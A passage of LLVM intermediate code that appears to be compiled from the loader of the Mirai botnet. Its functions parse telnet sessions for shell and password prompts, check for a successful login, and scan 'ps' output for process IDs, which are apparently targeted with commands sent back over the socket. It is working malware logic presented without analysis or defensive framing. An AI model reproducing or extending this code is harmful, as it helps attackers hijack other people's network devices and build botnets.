  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  store i32 %11, i32* %5, align 4
  br label %12

; <label>:12:                                     ; preds = %63, %1
  %13 = load i32, i32* %5, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %66

; <label>:15:                                     ; preds = %12
  %16 = load %struct.connection*, %struct.connection** %3, align 8
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %16, i32 0, i32 15
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [8192 x i8], [8192 x i8]* %17, i64 0, i64 %19
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp eq i32 %22, 58
  br i1 %23, label %60, label %24

; <label>:24:                                     ; preds = %15
  %25 = load %struct.connection*, %struct.connection** %3, align 8
  %26 = getelementptr inbounds %struct.connection, %struct.connection* %25, i32 0, i32 15
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [8192 x i8], [8192 x i8]* %26, i64 0, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 %31, 62
  br i1 %32, label %60, label %33

; <label>:33:                                     ; preds = %24
  %34 = load %struct.connection*, %struct.connection** %3, align 8
  %35 = getelementptr inbounds %struct.connection, %struct.connection* %34, i32 0, i32 15
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [8192 x i8], [8192 x i8]* %35, i64 0, i64 %37
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 36
  br i1 %41, label %60, label %42

; <label>:42:                                     ; preds = %33
  %43 = load %struct.connection*, %struct.connection** %3, align 8
  %44 = getelementptr inbounds %struct.connection, %struct.connection* %43, i32 0, i32 15
  %45 = load i32, i32* %5, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds [8192 x i8], [8192 x i8]* %44, i64 0, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 35
  br i1 %50, label %60, label %51

; <label>:51:                                     ; preds = %42
  %52 = load %struct.connection*, %struct.connection** %3, align 8
  %53 = getelementptr inbounds %struct.connection, %struct.connection* %52, i32 0, i32 15
  %54 = load i32, i32* %5, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [8192 x i8], [8192 x i8]* %53, i64 0, i64 %55
  %57 = load i8, i8* %56, align 1
  %58 = zext i8 %57 to i32
  %59 = icmp eq i32 %58, 37
  br i1 %59, label %60, label %62

; <label>:60:                                     ; preds = %51, %42, %33, %24, %15
  %61 = load i32, i32* %5, align 4
  store i32 %61, i32* %6, align 4
  br label %66

; <label>:62:                                     ; preds = %51
  br label %63

; <label>:63:                                     ; preds = %62
  %64 = load i32, i32* %5, align 4
  %65 = add nsw i32 %64, -1
  store i32 %65, i32* %5, align 4
  br label %12

; <label>:66:                                     ; preds = %60, %12
  %67 = load i32, i32* %6, align 4
  %68 = icmp eq i32 %67, -1
  br i1 %68, label %69, label %95

; <label>:69:                                     ; preds = %66
  %70 = load %struct.connection*, %struct.connection** %3, align 8
  %71 = getelementptr inbounds %struct.connection, %struct.connection* %70, i32 0, i32 15
  %72 = getelementptr inbounds [8192 x i8], [8192 x i8]* %71, i32 0, i32 0
  %73 = load %struct.connection*, %struct.connection** %3, align 8
  %74 = getelementptr inbounds %struct.connection, %struct.connection* %73, i32 0, i32 9
  %75 = load i16, i16* %74, align 8
  %76 = zext i16 %75 to i32
  %77 = call i32 @util_memsearch(i8* %72, i32 %76, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i32 0, i32 0), i32 4)
  store i32 %77, i32* %7, align 4
  %78 = icmp ne i32 %77, -1
  br i1 %78, label %79, label %81

; <label>:79:                                     ; preds = %69
  %80 = load i32, i32* %7, align 4
  store i32 %80, i32* %6, align 4
  br label %94

; <label>:81:                                     ; preds = %69
  %82 = load %struct.connection*, %struct.connection** %3, align 8
  %83 = getelementptr inbounds %struct.connection, %struct.connection* %82, i32 0, i32 15
  %84 = getelementptr inbounds [8192 x i8], [8192 x i8]* %83, i32 0, i32 0
  %85 = load %struct.connection*, %struct.connection** %3, align 8
  %86 = getelementptr inbounds %struct.connection, %struct.connection* %85, i32 0, i32 9
  %87 = load i16, i16* %86, align 8
  %88 = zext i16 %87 to i32
  %89 = call i32 @util_memsearch(i8* %84, i32 %88, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i32 5)
  store i32 %89, i32* %7, align 4
  %90 = icmp ne i32 %89, -1
  br i1 %90, label %91, label %93

; <label>:91:                                     ; preds = %81
  %92 = load i32, i32* %7, align 4
  store i32 %92, i32* %6, align 4
  br label %93

; <label>:93:                                     ; preds = %91, %81
  br label %94

; <label>:94:                                     ; preds = %93, %79
  br label %95

; <label>:95:                                     ; preds = %94, %66
  %96 = load i32, i32* %6, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %95
  store i32 0, i32* %2, align 4
  br label %101

; <label>:99:                                     ; preds = %95
  %100 = load i32, i32* %6, align 4
  store i32 %100, i32* %2, align 4
  br label %101

; <label>:101:                                    ; preds = %99, %98
  %102 = load i32, i32* %2, align 4
  ret i32 %102
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_password_prompt(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  store i32 %11, i32* %5, align 4
  br label %12

; <label>:12:                                     ; preds = %63, %1
  %13 = load i32, i32* %5, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %66

; <label>:15:                                     ; preds = %12
  %16 = load %struct.connection*, %struct.connection** %3, align 8
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %16, i32 0, i32 15
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [8192 x i8], [8192 x i8]* %17, i64 0, i64 %19
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp eq i32 %22, 58
  br i1 %23, label %60, label %24

; <label>:24:                                     ; preds = %15
  %25 = load %struct.connection*, %struct.connection** %3, align 8
  %26 = getelementptr inbounds %struct.connection, %struct.connection* %25, i32 0, i32 15
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [8192 x i8], [8192 x i8]* %26, i64 0, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 %31, 62
  br i1 %32, label %60, label %33

; <label>:33:                                     ; preds = %24
  %34 = load %struct.connection*, %struct.connection** %3, align 8
  %35 = getelementptr inbounds %struct.connection, %struct.connection* %34, i32 0, i32 15
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [8192 x i8], [8192 x i8]* %35, i64 0, i64 %37
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 36
  br i1 %41, label %60, label %42

; <label>:42:                                     ; preds = %33
  %43 = load %struct.connection*, %struct.connection** %3, align 8
  %44 = getelementptr inbounds %struct.connection, %struct.connection* %43, i32 0, i32 15
  %45 = load i32, i32* %5, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds [8192 x i8], [8192 x i8]* %44, i64 0, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 35
  br i1 %50, label %60, label %51

; <label>:51:                                     ; preds = %42
  %52 = load %struct.connection*, %struct.connection** %3, align 8
  %53 = getelementptr inbounds %struct.connection, %struct.connection* %52, i32 0, i32 15
  %54 = load i32, i32* %5, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [8192 x i8], [8192 x i8]* %53, i64 0, i64 %55
  %57 = load i8, i8* %56, align 1
  %58 = zext i8 %57 to i32
  %59 = icmp eq i32 %58, 37
  br i1 %59, label %60, label %62

; <label>:60:                                     ; preds = %51, %42, %33, %24, %15
  %61 = load i32, i32* %5, align 4
  store i32 %61, i32* %6, align 4
  br label %66

; <label>:62:                                     ; preds = %51
  br label %63

; <label>:63:                                     ; preds = %62
  %64 = load i32, i32* %5, align 4
  %65 = add nsw i32 %64, -1
  store i32 %65, i32* %5, align 4
  br label %12

; <label>:66:                                     ; preds = %60, %12
  %67 = load i32, i32* %6, align 4
  %68 = icmp eq i32 %67, -1
  br i1 %68, label %69, label %82

; <label>:69:                                     ; preds = %66
  %70 = load %struct.connection*, %struct.connection** %3, align 8
  %71 = getelementptr inbounds %struct.connection, %struct.connection* %70, i32 0, i32 15
  %72 = getelementptr inbounds [8192 x i8], [8192 x i8]* %71, i32 0, i32 0
  %73 = load %struct.connection*, %struct.connection** %3, align 8
  %74 = getelementptr inbounds %struct.connection, %struct.connection* %73, i32 0, i32 9
  %75 = load i16, i16* %74, align 8
  %76 = zext i16 %75 to i32
  %77 = call i32 @util_memsearch(i8* %72, i32 %76, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i32 7)
  store i32 %77, i32* %7, align 4
  %78 = icmp ne i32 %77, -1
  br i1 %78, label %79, label %81

; <label>:79:                                     ; preds = %69
  %80 = load i32, i32* %7, align 4
  store i32 %80, i32* %6, align 4
  br label %81

; <label>:81:                                     ; preds = %79, %69
  br label %82

; <label>:82:                                     ; preds = %81, %66
  %83 = load i32, i32* %6, align 4
  %84 = icmp eq i32 %83, -1
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %82
  store i32 0, i32* %2, align 4
  br label %88

; <label>:86:                                     ; preds = %82
  %87 = load i32, i32* %6, align 4
  store i32 %87, i32* %2, align 4
  br label %88

; <label>:88:                                     ; preds = %86, %85
  %89 = load i32, i32* %2, align 4
  ret i32 %89
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_prompt(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %7 = load %struct.connection*, %struct.connection** %3, align 8
  %8 = getelementptr inbounds %struct.connection, %struct.connection* %7, i32 0, i32 9
  %9 = load i16, i16* %8, align 8
  %10 = zext i16 %9 to i32
  store i32 %10, i32* %5, align 4
  br label %11

; <label>:11:                                     ; preds = %62, %1
  %12 = load i32, i32* %5, align 4
  %13 = icmp sge i32 %12, 0
  br i1 %13, label %14, label %65

; <label>:14:                                     ; preds = %11
  %15 = load %struct.connection*, %struct.connection** %3, align 8
  %16 = getelementptr inbounds %struct.connection, %struct.connection* %15, i32 0, i32 15
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds [8192 x i8], [8192 x i8]* %16, i64 0, i64 %18
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 58
  br i1 %22, label %59, label %23

; <label>:23:                                     ; preds = %14
  %24 = load %struct.connection*, %struct.connection** %3, align 8
  %25 = getelementptr inbounds %struct.connection, %struct.connection* %24, i32 0, i32 15
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds [8192 x i8], [8192 x i8]* %25, i64 0, i64 %27
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 62
  br i1 %31, label %59, label %32

; <label>:32:                                     ; preds = %23
  %33 = load %struct.connection*, %struct.connection** %3, align 8
  %34 = getelementptr inbounds %struct.connection, %struct.connection* %33, i32 0, i32 15
  %35 = load i32, i32* %5, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [8192 x i8], [8192 x i8]* %34, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 36
  br i1 %40, label %59, label %41

; <label>:41:                                     ; preds = %32
  %42 = load %struct.connection*, %struct.connection** %3, align 8
  %43 = getelementptr inbounds %struct.connection, %struct.connection* %42, i32 0, i32 15
  %44 = load i32, i32* %5, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [8192 x i8], [8192 x i8]* %43, i64 0, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 35
  br i1 %49, label %59, label %50

; <label>:50:                                     ; preds = %41
  %51 = load %struct.connection*, %struct.connection** %3, align 8
  %52 = getelementptr inbounds %struct.connection, %struct.connection* %51, i32 0, i32 15
  %53 = load i32, i32* %5, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [8192 x i8], [8192 x i8]* %52, i64 0, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %57, 37
  br i1 %58, label %59, label %61

; <label>:59:                                     ; preds = %50, %41, %32, %23, %14
  %60 = load i32, i32* %5, align 4
  store i32 %60, i32* %6, align 4
  br label %65

; <label>:61:                                     ; preds = %50
  br label %62

; <label>:62:                                     ; preds = %61
  %63 = load i32, i32* %5, align 4
  %64 = add nsw i32 %63, -1
  store i32 %64, i32* %5, align 4
  br label %11

; <label>:65:                                     ; preds = %59, %11
  %66 = load i32, i32* %6, align 4
  %67 = icmp eq i32 %66, -1
  br i1 %67, label %68, label %69

; <label>:68:                                     ; preds = %65
  store i32 0, i32* %2, align 4
  br label %71

; <label>:69:                                     ; preds = %65
  %70 = load i32, i32* %6, align 4
  store i32 %70, i32* %2, align 4
  br label %71

; <label>:71:                                     ; preds = %69, %68
  %72 = load i32, i32* %2, align 4
  ret i32 %72
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_verify_login(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %18

; <label>:16:                                     ; preds = %1
  %17 = load i32, i32* %4, align 4
  store i32 %17, i32* %2, align 4
  br label %18

; <label>:18:                                     ; preds = %16, %15
  %19 = load i32, i32* %2, align 4
  ret i32 %19
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_psoutput(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %16 = load %struct.connection*, %struct.connection** %3, align 8
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %16, i32 0, i32 15
  %18 = getelementptr inbounds [8192 x i8], [8192 x i8]* %17, i32 0, i32 0
  store i8* %18, i8** %5, align 8
  %19 = load %struct.connection*, %struct.connection** %3, align 8
  %20 = getelementptr inbounds %struct.connection, %struct.connection* %19, i32 0, i32 15
  %21 = getelementptr inbounds [8192 x i8], [8192 x i8]* %20, i32 0, i32 0
  %22 = load %struct.connection*, %struct.connection** %3, align 8
  %23 = getelementptr inbounds %struct.connection, %struct.connection* %22, i32 0, i32 9
  %24 = load i16, i16* %23, align 8
  %25 = zext i16 %24 to i32
  %26 = call i32 @util_memsearch(i8* %21, i32 %25, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %26, i32* %4, align 4
  store i32 0, i32* %6, align 4
  br label %27

; <label>:27:                                     ; preds = %277, %1
  %28 = load i32, i32* %6, align 4
  %29 = load i32, i32* %4, align 4
  %30 = icmp eq i32 %29, -1
  br i1 %30, label %31, label %36

; <label>:31:                                     ; preds = %27
  %32 = load %struct.connection*, %struct.connection** %3, align 8
  %33 = getelementptr inbounds %struct.connection, %struct.connection* %32, i32 0, i32 9
  %34 = load i16, i16* %33, align 8
  %35 = zext i16 %34 to i32
  br label %38

; <label>:36:                                     ; preds = %27
  %37 = load i32, i32* %4, align 4
  br label %38

; <label>:38:                                     ; preds = %36, %31
  %39 = phi i32 [ %35, %31 ], [ %37, %36 ]
  %40 = icmp slt i32 %28, %39
  br i1 %40, label %41, label %280

; <label>:41:                                     ; preds = %38
  %42 = load %struct.connection*, %struct.connection** %3, align 8
  %43 = getelementptr inbounds %struct.connection, %struct.connection* %42, i32 0, i32 15
  %44 = load i32, i32* %6, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [8192 x i8], [8192 x i8]* %43, i64 0, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 13
  br i1 %49, label %50, label %56

; <label>:50:                                     ; preds = %41
  %51 = load %struct.connection*, %struct.connection** %3, align 8
  %52 = getelementptr inbounds %struct.connection, %struct.connection* %51, i32 0, i32 15
  %53 = load i32, i32* %6, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [8192 x i8], [8192 x i8]* %52, i64 0, i64 %54
  store i8 0, i8* %55, align 1
  br label %276

; <label>:56:                                     ; preds = %41
  %57 = load %struct.connection*, %struct.connection** %3, align 8
  %58 = getelementptr inbounds %struct.connection, %struct.connection* %57, i32 0, i32 15
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds [8192 x i8], [8192 x i8]* %58, i64 0, i64 %60
  %62 = load i8, i8* %61, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 10
  br i1 %64, label %65, label %275

; <label>:65:                                     ; preds = %56
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  store i8* null, i8** %10, align 8
  store i8* null, i8** %11, align 8
  %66 = load %struct.connection*, %struct.connection** %3, align 8
  %67 = getelementptr inbounds %struct.connection, %struct.connection* %66, i32 0, i32 15
  %68 = load i32, i32* %6, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [8192 x i8], [8192 x i8]* %67, i64 0, i64 %69
  store i8 0, i8* %70, align 1
  store i32 0, i32* %7, align 4
  br label %71

; <label>:71:                                     ; preds = %154, %65
  %72 = load i32, i32* %7, align 4
  %73 = sext i32 %72 to i64
  %74 = load %struct.connection*, %struct.connection** %3, align 8
  %75 = getelementptr inbounds %struct.connection, %struct.connection* %74, i32 0, i32 15
  %76 = load i32, i32* %6, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [8192 x i8], [8192 x i8]* %75, i64 0, i64 %77
  %79 = load i8*, i8** %5, align 8
  %80 = ptrtoint i8* %78 to i64
  %81 = ptrtoint i8* %79 to i64
  %82 = sub i64 %80, %81
  %83 = icmp slt i64 %73, %82
  br i1 %83, label %84, label %157

; <label>:84:                                     ; preds = %71
  %85 = load i8*, i8** %5, align 8
  %86 = load i32, i32* %7, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds i8, i8* %85, i64 %87
  %89 = load i8, i8* %88, align 1
  %90 = sext i8 %89 to i32
  %91 = icmp eq i32 %90, 32
  br i1 %91, label %108, label %92

; <label>:92:                                     ; preds = %84
  %93 = load i8*, i8** %5, align 8
  %94 = load i32, i32* %7, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i8, i8* %93, i64 %95
  %97 = load i8, i8* %96, align 1
  %98 = sext i8 %97 to i32
  %99 = icmp eq i32 %98, 9
  br i1 %99, label %108, label %100

; <label>:100:                                    ; preds = %92
  %101 = load i8*, i8** %5, align 8
  %102 = load i32, i32* %7, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i8, i8* %101, i64 %103
  %105 = load i8, i8* %104, align 1
  %106 = sext i8 %105 to i32
  %107 = icmp eq i32 %106, 0
  br i1 %107, label %108, label %123

; <label>:108:                                    ; preds = %100, %92, %84
  %109 = load i8, i8* %8, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp sgt i32 %110, 0
  br i1 %111, label %112, label %118

; <label>:112:                                    ; preds = %108
  %113 = load i8, i8* %9, align 1
  %114 = icmp ne i8 %113, 0
  br i1 %114, label %118, label %115

; <label>:115:                                    ; preds = %112
  %116 = load i8, i8* %8, align 1
  %117 = add i8 %116, 1
  store i8 %117, i8* %8, align 1
  br label %118

; <label>:118:                                    ; preds = %115, %112, %108
  %119 = load i8*, i8** %5, align 8
  %120 = load i32, i32* %7, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8, i8* %119, i64 %121
  store i8 0, i8* %122, align 1
  store i8 1, i8* %9, align 1
  br label %153

; <label>:123:                                    ; preds = %100
  %124 = load i8, i8* %8, align 1
  %125 = zext i8 %124 to i32
  %126 = icmp eq i32 %125, 0
  br i1 %126, label %127, label %134

; <label>:127:                                    ; preds = %123
  %128 = load i8*, i8** %5, align 8
  %129 = load i32, i32* %7, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8, i8* %128, i64 %130
  store i8* %131, i8** %10, align 8
  %132 = load i8, i8* %8, align 1
  %133 = add i8 %132, 1
  store i8 %133, i8* %8, align 1
  br label %152

; <label>:134:                                    ; preds = %123
  %135 = load i8, i8* %8, align 1
  %136 = zext i8 %135 to i32
  %137 = icmp sge i32 %136, 3
  br i1 %137, label %138, label %151

; <label>:138:                                    ; preds = %134
  %139 = load i8, i8* %8, align 1
  %140 = zext i8 %139 to i32
  %141 = icmp sle i32 %140, 5
  br i1 %141, label %142, label %151

; <label>:142:                                    ; preds = %138
  %143 = load i8, i8* %9, align 1
  %144 = sext i8 %143 to i32
  %145 = icmp ne i32 %144, 0
  br i1 %145, label %146, label %151

; <label>:146:                                    ; preds = %142
  %147 = load i8*, i8** %5, align 8
  %148 = load i32, i32* %7, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds i8, i8* %147, i64 %149
  store i8* %150, i8** %11, align 8
  br label %151

; <label>:151:                                    ; preds = %146, %142, %138, %134
  br label %152

; <label>:152:                                    ; preds = %151, %127
  store i8 0, i8* %9, align 1
  br label %153

; <label>:153:                                    ; preds = %152, %118
  br label %154

; <label>:154:                                    ; preds = %153
  %155 = load i32, i32* %7, align 4
  %156 = add nsw i32 %155, 1
  store i32 %156, i32* %7, align 4
  br label %71

; <label>:157:                                    ; preds = %71
  %158 = load i8*, i8** %10, align 8
  %159 = icmp ne i8* %158, null
  br i1 %159, label %160, label %267

; <label>:160:                                    ; preds = %157
  %161 = load i8*, i8** %11, align 8
  %162 = icmp ne i8* %161, null
  br i1 %162, label %163, label %267

; <label>:163:                                    ; preds = %160
  %164 = load i8*, i8** %10, align 8
  %165 = call i32 @atoi(i8* %164) #6
  store i32 %165, i32* %12, align 4
  %166 = load i8*, i8** %11, align 8
  %167 = call i64 @strlen(i8* %166) #6
  %168 = trunc i64 %167 to i32
  store i32 %168, i32* %13, align 4
  %169 = load i32, i32* %12, align 4
  %170 = icmp ne i32 %169, 1
  br i1 %170, label %171, label %185

; <label>:171:                                    ; preds = %163
  %172 = load i8*, i8** %11, align 8
  %173 = call i32 @strcmp(i8* %172, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i32 0, i32 0)) #6
  %174 = icmp eq i32 %173, 0
  br i1 %174, label %179, label %175

; <label>:175:                                    ; preds = %171
  %176 = load i8*, i8** %11, align 8
  %177 = call i32 @strcmp(i8* %176, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0)) #6
  %178 = icmp eq i32 %177, 0
  br i1 %178, label %179, label %185

; <label>:179:                                    ; preds = %175, %171
  %180 = load %struct.connection*, %struct.connection** %3, align 8
  %181 = getelementptr inbounds %struct.connection, %struct.connection* %180, i32 0, i32 4
  %182 = load i32, i32* %181, align 8
  %183 = load i32, i32* %12, align 4
  %184 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %182, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.11, i32 0, i32 0), i32 %183)
  br label %266

; <label>:185:                                    ; preds = %175, %163
  %186 = load i32, i32* %12, align 4
  %187 = icmp sgt i32 %186, 400
  br i1 %187, label %188, label %265

; <label>:188:                                    ; preds = %185
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %7, align 4
  br label %189

; <label>:189:                                    ; preds = %249, %188
  %190 = load i32, i32* %7, align 4
  %191 = load i32, i32* %13, align 4
  %192 = icmp slt i32 %190, %191
  br i1 %192, label %193, label %252

; <label>:193:                                    ; preds = %189
  %194 = load i8*, i8** %11, align 8
  %195 = load i32, i32* %7, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds i8, i8* %194, i64 %196
  %198 = load i8, i8* %197, align 1
  %199 = sext i8 %198 to i32
  %200 = icmp sge i32 %199, 48
  br i1 %200, label %201, label %212

; <label>:201:                                    ; preds = %193
  %202 = load i8*, i8** %11, align 8
  %203 = load i32, i32* %7, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds i8, i8* %202, i64 %204
  %206 = load i8, i8* %205, align 1
  %207 = sext i8 %206 to i32
  %208 = icmp sle i32 %207, 57
  br i1 %208, label %209, label %212

; <label>:209:                                    ; preds = %201
  %210 = load i32, i32* %14, align 4
  %211 = add nsw i32 %210, 1
  store i32 %211, i32* %14, align 4
  br label %248

; <label>:212:                                    ; preds = %201, %193
  %213 = load i8*, i8** %11, align 8
  %214 = load i32, i32* %7, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds i8, i8* %213, i64 %215
  %217 = load i8, i8* %216, align 1
  %218 = sext i8 %217 to i32
  %219 = icmp sge i32 %218, 97
  br i1 %219, label %220, label %228

; <label>:220:                                    ; preds = %212
  %221 = load i8*, i8** %11, align 8
  %222 = load i32, i32* %7, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds i8, i8* %221, i64 %223
  %225 = load i8, i8* %224, align 1
  %226 = sext i8 %225 to i32
  %227 = icmp sle i32 %226, 122
  br i1 %227, label %244, label %228

; <label>:228:                                    ; preds = %220, %212
  %229 = load i8*, i8** %11, align 8
  %230 = load i32, i32* %7, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds i8, i8* %229, i64 %231
  %233 = load i8, i8* %232, align 1
  %234 = sext i8 %233 to i32
  %235 = icmp sge i32 %234, 65
  br i1 %235, label %236, label %247

; <label>:236:                                    ; preds = %228
  %237 = load i8*, i8** %11, align 8
  %238 = load i32, i32* %7, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds i8, i8* %237, i64 %239
  %241 = load i8, i8* %240, align 1
  %242 = sext i8 %241 to i32
  %243 = icmp sle i32 %242, 90
  br i1 %243, label %244, label %247

; <label>:244:                                    ; preds = %236, %220
  %245 = load i32, i32* %15, align 4
  %246 = add nsw i32 %245, 1
  store i32 %246, i32* %15, align 4
  br label %252

; <label>:247:                                    ; preds = %236, %228
  br label %248

; <label>:248:                                    ; preds = %247, %209
  br label %249

; <label>:249:                                    ; preds = %248
  %250 = load i32, i32* %7, align 4
  %251 = add nsw i32 %250, 1
  store i32 %251, i32* %7, align 4
  br label %189

; <label>:252:                                    ; preds = %244, %189
  %253 = load i32, i32* %15, align 4
  %254 = icmp eq i32 %253, 0
  br i1 %254, label %255, label %264

; <label>:255:                                    ; preds = %252
  %256 = load i32, i32* %14, align 4
  %257 = icmp sgt i32 %256, 0
  br i1 %257, label %258, label %264

; <label>:258:                                    ; preds = %255
  %259 = load %struct.connection*, %struct.connection** %3, align 8
  %260 = getelementptr inbounds %struct.connection, %struct.connection* %259, i32 0, i32 4
  %261 = load i32, i32* %260, align 8
  %262 = load i32, i32* %12, align 4
  %263 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %261, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.11, i32 0, i32 0), i32 %262)
  br label %264

; <label>:264:                                    ; preds = %258, %255, %252
  br label %265

; <label>:265:                                    ; preds = %264, %185
  br label %266

; <label>:266:                                    ; preds = %265, %179
  br label %267

; <label>:267:                                    ; preds = %266, %160, %157
